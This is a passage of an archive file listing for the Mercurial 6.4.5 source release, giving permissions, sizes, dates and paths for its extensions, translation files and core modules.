--rw-r--r--   0 alphare   (1000) alphare   (1000)     2717 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/closehead.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2404 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/commitextras.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.372352 mercurial-6.4.5/hgext/convert/
--rw-r--r--   0 alphare   (1000) alphare   (1000)    23862 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/convert/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    12483 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/convert/bzr.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    17626 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/convert/common.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    22644 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/convert/convcmd.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11351 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/convert/cvs.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    36291 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/convert/cvsps.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7837 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/convert/darcs.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    18068 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/convert/filemap.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    17697 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/convert/git.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    13259 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/convert/gnuarch.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    25346 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/convert/hg.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    13877 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/convert/monotone.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    13026 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/convert/p4.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    61956 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/convert/subversion.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5365 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/convert/transport.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    16679 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/eol.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    25435 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/extdiff.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4948 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/factotum.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.376352 mercurial-6.4.5/hgext/fastannotate/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6532 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/fastannotate/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    12154 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/fastannotate/commands.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    31416 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/fastannotate/context.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      374 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/fastannotate/error.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5879 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/fastannotate/formatter.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8054 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/fastannotate/protocol.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8726 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/fastannotate/revmap.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4124 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/fastannotate/support.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6982 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/fastexport.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6520 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/fetch.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    37275 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/fix.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.376352 mercurial-6.4.5/hgext/fsmonitor/
--rw-r--r--   0 alphare   (1000) alphare   (1000)    33169 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/fsmonitor/__init__.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.376352 mercurial-6.4.5/hgext/fsmonitor/pywatchman/
--rw-r--r--   0 alphare   (1000) alphare   (1000)    38268 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/fsmonitor/pywatchman/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    32099 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/fsmonitor/pywatchman/bser.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2665 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/fsmonitor/pywatchman/capabilities.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2043 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/fsmonitor/pywatchman/compat.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2822 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/fsmonitor/pywatchman/encoding.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3650 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/fsmonitor/pywatchman/load.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    18028 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/fsmonitor/pywatchman/pybser.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4744 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/fsmonitor/state.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3883 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/fsmonitor/watchmanclient.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.376352 mercurial-6.4.5/hgext/git/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1105 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/git/TODO.md
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11921 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/git/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11722 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/git/dirstate.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    18158 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/git/gitlog.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      988 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/git/gitutil.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11605 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/git/index.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    12250 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/git/manifest.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    33129 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/githelp.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11271 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/gpg.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3360 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/graphlog.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    12065 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/hgk.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.376352 mercurial-6.4.5/hgext/highlight/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3612 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/highlight/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3129 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/highlight/highlight.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    87676 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/histedit.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.376352 mercurial-6.4.5/hgext/hooklib/
--rw-r--r--   0 alphare   (1000) alphare   (1000)      999 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/hooklib/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3967 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/hooklib/changeset_obsoleted.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3766 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/hooklib/changeset_published.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1374 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/hooklib/enforce_draft_commits.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1335 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/hooklib/reject_merge_commits.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1233 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/hooklib/reject_new_heads.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.376352 mercurial-6.4.5/hgext/infinitepush/
--rw-r--r--   0 alphare   (1000) alphare   (1000)      943 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/infinitepush/README
--rw-r--r--   0 alphare   (1000) alphare   (1000)    45911 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/infinitepush/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3640 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/infinitepush/bundleparts.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1221 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/infinitepush/common.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3473 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/infinitepush/fileindexapi.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2066 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/infinitepush/indexapi.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1076 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/infinitepush/schema.sql
--rw-r--r--   0 alphare   (1000) alphare   (1000)     9883 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/infinitepush/sqlindexapi.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6241 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/infinitepush/store.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    20494 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/journal.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    30687 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/keyword.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.376352 mercurial-6.4.5/hgext/largefiles/
--rw-r--r--   0 alphare   (1000) alphare   (1000)      172 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/largefiles/CONTRIBUTORS
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6901 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/largefiles/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6612 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/largefiles/basestore.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    22797 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/largefiles/lfcommands.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    26928 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/largefiles/lfutil.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2498 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/largefiles/localstore.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    64251 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/largefiles/overrides.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7703 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/largefiles/proto.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5159 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/largefiles/remotestore.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    18695 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/largefiles/reposetup.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2663 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/largefiles/storefactory.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1572 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/largefiles/wirestore.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.376352 mercurial-6.4.5/hgext/lfs/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7670 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/lfs/TODO.rst
--rw-r--r--   0 alphare   (1000) alphare   (1000)    14598 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/lfs/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    29006 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/lfs/blobstore.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2847 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/lfs/pointer.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    12003 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/lfs/wireprotolfsserver.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    17138 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/lfs/wrapper.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2862 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/logtoprocess.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)   146637 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/mq.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.376352 mercurial-6.4.5/hgext/narrow/
--rw-r--r--   0 alphare   (1000) alphare   (1000)      782 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/narrow/TODO.rst
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2378 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/narrow/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11300 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/narrow/narrowbundle2.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    24515 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/narrow/narrowcommands.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2519 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/narrow/narrowdirstate.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      890 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/narrow/narrowrepo.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1481 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/narrow/narrowtemplates.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4839 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/narrow/narrowwirepeer.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    20518 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/notify.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2602 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/pager.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    31840 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/patchbomb.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    82651 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/phabricator.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1747 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/purge.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    84142 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/rebase.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5155 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/record.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    22314 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/releasenotes.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6775 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/relink.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.376352 mercurial-6.4.5/hgext/remotefilelog/
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6096 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/remotefilelog/README.md
--rw-r--r--   0 alphare   (1000) alphare   (1000)    42141 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/remotefilelog/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    18524 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/remotefilelog/basepack.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    15838 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/remotefilelog/basestore.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2429 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/remotefilelog/connectionpool.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      966 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/remotefilelog/constants.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    13163 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/remotefilelog/contentstore.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    15846 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/remotefilelog/datapack.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    13599 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/remotefilelog/debugcommands.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    22766 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/remotefilelog/fileserverclient.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    19110 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/remotefilelog/historypack.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5241 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/remotefilelog/metadatastore.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    19317 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/remotefilelog/remotefilectx.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    15742 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/remotefilelog/remotefilelog.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    14389 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/remotefilelog/remotefilelogserver.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    31000 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/remotefilelog/repack.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11103 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/remotefilelog/shallowbundle.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11964 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/remotefilelog/shallowrepo.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      452 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/remotefilelog/shallowstore.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    15312 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/remotefilelog/shallowutil.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      586 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/remotefilelog/shallowverifier.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    13853 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/remotenames.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     5338 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/schemes.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7884 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/share.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    16293 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/show.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    12320 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/sparse.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6905 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/split.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    40162 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/sqlitestore.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      914 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/strip.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    30733 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/transplant.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    10328 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/uncommit.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7071 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/win32mbcs.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7628 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/win32text.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.376352 mercurial-6.4.5/hgext/zeroconf/
--rw-r--r--   0 alphare   (1000) alphare   (1000)    61582 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/zeroconf/Zeroconf.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6996 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext/zeroconf/__init__.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.376352 mercurial-6.4.5/hgext3rd/
--rw-r--r--   0 alphare   (1000) alphare   (1000)      119 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgext3rd/__init__.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)      685 2023-06-22 09:18:26.000000 mercurial-6.4.5/hgweb.cgi
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.380352 mercurial-6.4.5/i18n/
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     7524 2023-06-22 09:18:26.000000 mercurial-6.4.5/i18n/check-translation.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)   528626 2023-06-22 09:18:26.000000 mercurial-6.4.5/i18n/da.po
--rw-r--r--   0 alphare   (1000) alphare   (1000)   784964 2023-06-22 09:18:26.000000 mercurial-6.4.5/i18n/de.po
--rw-r--r--   0 alphare   (1000) alphare   (1000)   252621 2023-06-22 09:18:26.000000 mercurial-6.4.5/i18n/el.po
--rw-r--r--   0 alphare   (1000) alphare   (1000)   334018 2023-06-22 09:18:26.000000 mercurial-6.4.5/i18n/fr.po
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     5323 2023-06-22 09:18:26.000000 mercurial-6.4.5/i18n/hggettext
--rw-r--r--   0 alphare   (1000) alphare   (1000)   415076 2023-06-22 09:18:26.000000 mercurial-6.4.5/i18n/it.po
--rw-r--r--   0 alphare   (1000) alphare   (1000)  1514529 2023-06-22 09:18:26.000000 mercurial-6.4.5/i18n/ja.po
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1065 2023-06-22 09:18:26.000000 mercurial-6.4.5/i18n/polib.LICENSE
--rw-r--r--   0 alphare   (1000) alphare   (1000)    62021 2023-06-22 09:18:26.000000 mercurial-6.4.5/i18n/polib.py
--rwxr-xr-x   0 alphare   (1000) alphare   (1000)     3205 2023-06-22 09:18:26.000000 mercurial-6.4.5/i18n/posplit
--rw-r--r--   0 alphare   (1000) alphare   (1000)  1520527 2023-06-22 09:18:26.000000 mercurial-6.4.5/i18n/pt_BR.po
--rw-r--r--   0 alphare   (1000) alphare   (1000)   427542 2023-06-22 09:18:26.000000 mercurial-6.4.5/i18n/ro.po
--rw-r--r--   0 alphare   (1000) alphare   (1000)  1285212 2023-06-22 09:18:26.000000 mercurial-6.4.5/i18n/ru.po
--rw-r--r--   0 alphare   (1000) alphare   (1000)   580645 2023-06-22 09:18:26.000000 mercurial-6.4.5/i18n/sv.po
--rw-r--r--   0 alphare   (1000) alphare   (1000)   269346 2023-06-22 09:18:26.000000 mercurial-6.4.5/i18n/zh_CN.po
--rw-r--r--   0 alphare   (1000) alphare   (1000)   323995 2023-06-22 09:18:26.000000 mercurial-6.4.5/i18n/zh_TW.po
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.388352 mercurial-6.4.5/mercurial/
--rw-r--r--   0 alphare   (1000) alphare   (1000)      377 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)       60 2023-06-22 09:18:52.000000 mercurial-6.4.5/mercurial/__version__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    12717 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/ancestor.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    10670 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/archival.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7249 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/bdiff.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)      463 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/bdiff.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1767 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/bitmanipulation.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)    35416 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/bookmarks.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    32260 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/branchmap.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    89418 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/bundle2.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    16318 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/bundlecaches.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    24962 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/bundlerepo.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      788 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/cacheutil.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.388352 mercurial-6.4.5/mercurial/cext/
--rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/cext/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3638 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/cext/base85.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)      145 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/cext/base85.pyi
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7484 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/cext/bdiff.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)      348 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/cext/bdiff.pyi
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11094 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/cext/charencode.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2198 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/cext/charencode.h
--rw-r--r--   0 alphare   (1000) alphare   (1000)     7338 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/cext/dirs.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)    26543 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/cext/manifest.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     4542 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/cext/mpatch.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)      193 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/cext/mpatch.pyi
--rw-r--r--   0 alphare   (1000) alphare   (1000)    29410 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/cext/osutil.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)      610 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/cext/osutil.pyi
--rw-r--r--   0 alphare   (1000) alphare   (1000)    34935 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/cext/parsers.c
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3107 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/cext/parsers.pyi
--rw-r--r--   0 alphare   (1000) alphare   (1000)    17426 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/cext/pathencode.c
